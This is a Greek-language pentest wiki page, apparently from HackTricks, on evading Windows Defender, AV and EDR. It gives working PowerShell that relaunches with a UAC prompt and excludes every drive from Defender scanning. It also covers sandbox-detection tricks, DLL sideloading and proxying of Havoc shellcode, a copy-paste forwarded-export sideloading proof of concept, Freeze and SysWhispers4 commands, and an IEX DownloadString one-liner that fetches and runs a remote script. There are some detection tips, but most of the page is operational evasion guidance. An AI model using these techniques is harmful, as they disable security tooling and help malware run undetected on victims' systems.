# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για τη διακοπή της λειτουργίας του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για τη διακοπή της λειτουργίας του Windows Defender, προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC τύπου installer πριν από την παραποίηση του Defender

Δημόσια loaders που μεταμφιέζονται συχνά σε game cheats διανέμονται ως ανυπόγραφοι installers Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη να τους εκτελέσει με αυξημένα δικαιώματα** και μετά εξουδετερώνουν τον Defender. Η διαδικασία είναι απλή:

1. Ελέγχει αν υπάρχει πλαίσιο διαχειριστή με `net session`. Η εντολή πετυχαίνει μόνο όταν ο χρήστης που την εκτελεί έχει δικαιώματα admin, επομένως η αποτυχία δείχνει ότι ο loader εκτελείται ως τυπικός χρήστης.
2. Επανεκκινεί αμέσως τον εαυτό του με το ρήμα `RunAs`, ώστε να εμφανιστεί η αναμενόμενη προτροπή συγκατάθεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «cracked» λογισμικό, οπότε συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσει αυξημένα δικαιώματα, η αλυσίδα τύπου GachiLoader μεγιστοποιεί τα τυφλά σημεία του Defender αντί να απενεργοποιήσει εντελώς την υπηρεσία. Ο loader πρώτα τερματίζει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και έπειτα προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην είναι δυνατή η σάρωση κάθε προφίλ χρήστη, καταλόγου συστήματος και αφαιρούμενου δίσκου:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), επομένως **κάθε μελλοντικό payload που θα αποθηκευτεί οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προληπτικός — οι επιτιθέμενοι διατηρούν τη δυνατότητα να φορτώσουν αργότερα unsigned drivers, χωρίς να χρειαστεί να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές καταγράφονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ενεργές ή να τις επεκτείνουν χωρίς να ενεργοποιηθεί ξανά το UAC.

Καθώς δεν διακόπτεται καμία υπηρεσία του Defender, οι επιφανειακοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «το antivirus είναι ενεργό», παρόλο που ο έλεγχος σε πραγματικό χρόνο δεν εξετάζει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία AV Evasion**

Σήμερα, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγχουν αν ένα αρχείο είναι κακόβουλο: στατική ανίχνευση, δυναμική ανάλυση και, στα πιο προηγμένα EDR, ανάλυση συμπεριφοράς.

### **Στατική ανίχνευση**

Η στατική ανίχνευση εντοπίζει γνωστές κακόβουλες συμβολοσειρές ή ακολουθίες byte σε ένα binary ή script, ενώ παράλληλα εξάγει πληροφορίες από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, ψηφιακές υπογραφές, εικονίδιο, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και χαρακτηριστεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι παράκαμψης αυτού του είδους ανίχνευσης:

- **Κρυπτογράφηση**

Αν κρυπτογραφήσετε το binary, το AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιον loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένες συμβολοσειρές στο binary ή στο script σας για να το παρακάμψετε το AV, αλλά αυτό μπορεί να απαιτήσει αρκετό χρόνο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακόβουλες υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε τη στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Χωρίζει το αρχείο σε πολλαπλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σας δείξει ακριβώς ποιες συμβολοσειρές ή ποια byte στο binary σας επισημαίνονται.

Σας συνιστώ ανεπιφύλακτα να δείτε αυτήν την [playlist στο YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με πρακτικές τεχνικές AV Evasion.

### Δοκιμές offline χαρακτηριστικών PE για στατικούς ταξινομητές

Τα bytes ενός packed ή κρυπτογραφημένου payload αποτελούν μόνο ένα από τα δεδομένα εισόδου ενός στατικού ταξινομητή. Το EMBER2024 εξάγει χαρακτηριστικά PE, όπως imports, exports, sections, headers και δεδομένα Authenticode.<sup>[[48]](#references)</sup> Σε ένα πείραμα με loader, η προσθήκη 141 imports που έμοιαζαν αβλαβή μείωσε κατά 93% τη βαθμολογία κακόβουλης δραστηριότητας του EMBER2024, ενώ imports που συσχετίζονται με malware την αύξησαν. Αυτό ισχύει για το συγκεκριμένο μοντέλο και τα συγκεκριμένα δείγματα· δεν αποτελεί αξιόπιστη παράκαμψη ενός συγκεκριμένου προϊόντος AV/EDR.<sup>[[50]](#references)</sup>

Για μια εξουσιοδοτημένη δοκιμή loader, διατηρήστε σταθερά το payload και τη διαδρομή εκτέλεσης, αλλάξτε μία προβλεπόμενη μεταβλητή build ανά παραλλαγή και συγκρίνετε τις βαθμολογίες offline. Εξετάστε τα χαρακτηριστικά PE που προκύπτουν, καθώς μια αλλαγή στο build μπορεί να επηρεάσει περισσότερες από μία ομάδες χαρακτηριστικών.<sup>[[49]](#references)[[50]](#references)</sup> Για να διατηρήσετε τα προβλεπόμενα imports στο IAT, καλέστε τα επιλεγμένα Win32 APIs από κώδικα που είναι προσβάσιμος. Αλλάζετε την επιλογή και κατανέμετε τα σημεία κλήσης μεταξύ των builds, αντί να δημιουργήσετε μια σταθερή συνάρτηση παραπλάνησης που θα μπορούσε να γίνει υπογραφή. Στο πείραμα αναφέρθηκαν επίσης χαμηλότερες βαθμολογίες με έγκυρη code signing, εγγραφές export και περισσότερες συναρτήσεις που αυξάνουν το μέγεθος του `.pdata`. Η μη έγκυρη υπογραφή είχε μικρή επίδραση, ενώ η επίδραση του `.pdata` ήταν περιορισμένη.<sup>[[50]](#references)</sup>

Το πακέτο `thrember` παρέχει εξαγωγή χαρακτηριστικών και μοντέλα benchmark. Αφού το εγκαταστήσετε, χρησιμοποιήστε το `thrember.download_models("models")` με έναν υπάρχοντα φάκελο `models` και, στη συνέχεια, εκτελέστε τον scorer από τον γονικό φάκελο: η βοηθητική συνάρτηση λήψης αλλάζει τον τρέχοντα φάκελο εργασίας. Ο ταξινομητής PE μπορεί να βαθμολογήσει έναν φάκελο με builds χωρίς να τα υποβάλει σε υπηρεσία σάρωσης:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Κρατήστε σταθερές τις εκδόσεις του model και του feature extractor κατά τη σύγκριση. Μια χαμηλότερη offline βαθμολογία δείχνει μόνο πώς αντιδρά αυτός ο classifier στο τροποποιημένο binary· δεν αποδεικνύει αποφυγή της behavioral analysis, της emulation ή ενός διαφορετικού model κάποιου vendor.<sup>[[49]](#references)[[50]](#references)</sup> Για [polymorphism ανά build και camouflage του εξωτερικού binary σε virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), δείτε το ξεχωριστό execution model.

### **Δυναμική ανάλυση**

Δυναμική ανάλυση είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά μπορείτε να κάνετε ορισμένα πράγματα για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με την υλοποίησή της, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης της δυναμικής ανάλυσης του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία, ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, οπότε οι μεγάλες αναμονές μπορούν να παρεμποδίσουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλώς να παραλείψουν την αναμονή, ανάλογα με την υλοποίησή της.
- **Έλεγχος πόρων του μηχανήματος** Συνήθως τα sandboxes διαθέτουν πολύ λίγους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί, για παράδειγμα ελέγχοντας τη θερμοκρασία του CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν αντιστοιχεί σε αυτό που έχετε ορίσει. Αν δεν αντιστοιχεί, μπορείτε να τερματίσετε το πρόγραμμά σας.

Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender's Sandbox είναι HAL9TH, οπότε μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την εκτέλεσή του. Αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να τερματίσετε το πρόγραμμά σας.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε και νωρίτερα σε αυτή την ανάρτηση, τα **public tools** τελικά **θα εντοπιστούν**, οπότε πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται όντως να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε κάποιο άλλο, λιγότερο γνωστό project που κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι μάλλον το δεύτερο. Αν πάρουμε ως παράδειγμα το mimikatz, είναι πιθανότατα ένα από τα πιο επισημασμένα malware από τα AV και τα EDR, αν όχι το πιο επισημασμένο. Παρότι το ίδιο το project είναι πολύ καλό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV, οπότε απλώς αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να πετύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας εντοπίζεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε το εκεί μέχρι να είστε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, **προτιμάτε πάντα τη χρήση DLLs για evasion**. Από την εμπειρία μου, τα αρχεία DLL συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε αυτό είναι ένα πολύ απλό τέχνασμα που μπορείτε να χρησιμοποιήσετε για να αποφύγετε τον εντοπισμό σε ορισμένες περιπτώσεις (αν, φυσικά, το payload σας μπορεί να εκτελεστεί ως DLL).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά τεχνάσματα που μπορείτε να χρησιμοποιήσετε με αρχεία DLL για να είστε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** αξιοποιεί τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και τα κακόβουλα payloads δίπλα-δίπλα.

Μπορείτε να εντοπίσετε προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο script σε powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που είναι ευάλωτα σε DLL Hijacking/Sideloading**. Αυτή η τεχνική είναι αρκετά stealthy όταν εφαρμόζεται σωστά, αλλά αν χρησιμοποιήσετε προγράμματα DLL Sideloadable που είναι γνωστά στο κοινό, μπορεί να σας εντοπίσουν εύκολα.

Απλώς τοποθετώντας μια κακόβουλη DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σας, καθώς το πρόγραμμα περιμένει να υπάρχουν συγκεκριμένες συναρτήσεις μέσα σε αυτήν την DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από την proxy (και κακόβουλη) DLL στην αρχική DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και την αρχική DLL μετονομασμένη.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και [το βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα και σε μεγαλύτερο βάθος για όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι μονάδες Windows PE μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η εγγραφή εξαγωγής περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader:

- Φορτώνει το `TargetDll` αν δεν έχει ήδη φορτωθεί
- Επιλύει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο χώρο ονομάτων KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της μονάδας που πραγματοποιεί την προώθηση.

Αυτό επιτρέπει ένα έμμεσο primitive sideloading: εντοπίστε ένα υπογεγραμμένο DLL που εξάγει μια συνάρτηση η οποία προωθείται σε όνομα μονάδας που δεν είναι KnownDLL και, στη συνέχεια, τοποθετήστε δίπλα σε αυτό ένα DLL που ελέγχετε εσείς και έχει ακριβώς το όνομα του προωθούμενου target module. Όταν κληθεί το forwarded export, ο loader επιλύει την προώθηση και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για να επιτευχθεί εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε το forward με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα εμφανιστεί σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Hunting tips:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το απόθεμα forwarder των Windows 11 για να αναζητήσετε υποψήφιες επιλογές: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για ανίχνευση/άμυνα:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν υπογεγραμμένα DLL από διαδρομές εκτός συστήματος και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο βασικό όνομα από εκείνον τον κατάλογο
- Δημιουργήστε ειδοποίηση για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → `keyiso.dll` εκτός συστήματος → `NCRYPTPROV.dll` σε διαδρομές όπου μπορούν να γίνει εγγραφή από χρήστες
- Επιβάλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε εγγραφή+εκτέλεση σε καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα toolkit payload για παράκαμψη EDR μέσω ανασταλμένων διεργασιών, direct syscalls και εναλλακτικών μεθόδων εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με αθέατο τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή εντοπισμού είναι ένα παιχνίδι γάτας και ποντικιού· αυτό που λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο εργαλείο. Αν είναι δυνατόν, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές αποφυγής εντοπισμού.

## Direct/Indirect Syscalls & επίλυση SSN (SysWhispers4)

Τα EDR συχνά τοποθετούν **inline hooks σε user-mode** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εκπέμπει μια εντολή `syscall`/`sysenter`/`SVC #0` στο παραγόμενο stub (δεν γίνεται πρόσβαση σε export του `ntdll`).
- **Indirect**: μεταβαίνει σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για αποφυγή ευρετικών ελέγχων)· το **randomized indirect** επιλέγει ένα gadget από ένα σύνολο για κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· εντοπίζει μια ακολουθία syscall κατά τον χρόνο εκτέλεσης.

**Στρατηγικές επίλυσης SSN ανθεκτικές σε hooks:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSN ταξινομώντας τα syscall stubs κατά εικονική διεύθυνση, αντί να διαβάζει τα bytes των stubs.
- **SyscallsFromDisk**: αντιστοιχίζει ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` και έπειτα το αποχαρτογραφεί (παρακάμπτει όλα τα hooks στη μνήμη).
- **RecycledGate**: συνδυάζει τη συναγωγή SSN μέσω ταξινόμησης VA με επικύρωση opcode όταν ένα stub είναι καθαρό· αν εντοπιστεί hook, επιστρέφει στη συναγωγή μέσω VA.
- **HW Breakpoint**: ορίζει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά τον χρόνο εκτέλεσης, χωρίς να αναλύει hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Κατά την ανάλυση καθαρών εξαγωγών syscall του `ntdll` x64 για ένα SSN, επιτρέψτε τόσο το `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) όσο και την ίδια ακολουθία με πρόθεμα `F3 0F 1E FA` (`endbr64`). Το δεύτερο είναι ένα stub με πρόθεμα CET: ένας parser που θεωρεί ότι το SSN βρίσκεται πάντα σε σταθερό offset θα το παραβλέψει. Αν αποτύχει η αρχικοποίηση του indirect-syscall και ο loader επιστρέψει στη χρήση του `GetProcAddress`, οι κλήσεις μέσω αυτών των exports μπορεί να συναντήσουν ξανά user-mode hooks.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το «[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)». Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσατε με κάποιον τρόπο να εκτελέσετε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα παρακάτω στοιχεία των Windows.

- User Account Control ή UAC (ανύψωση δικαιωμάτων EXE, COM, MSI ή εγκατάστασης ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μορφή που είναι ταυτόχρονα αποκρυπτογραφημένη και αποσυσκοτισμένη.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα εμφανίσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει μπροστά το `amsi:` και έπειτα τη διαδρομή προς το εκτελέσιμο από το οποίο εκτελέστηκε το script, σε αυτή την περίπτωση, το powershell.exe

Δεν γράψαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη εξαιτίας του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη χρήση της `Assembly.Load(byte[])` για φόρτωση εκτέλεσης στη μνήμη. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι να παρακάμψετε το AMSI:

- **Obfuscation**

Επειδή το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής της ανίχνευσης.

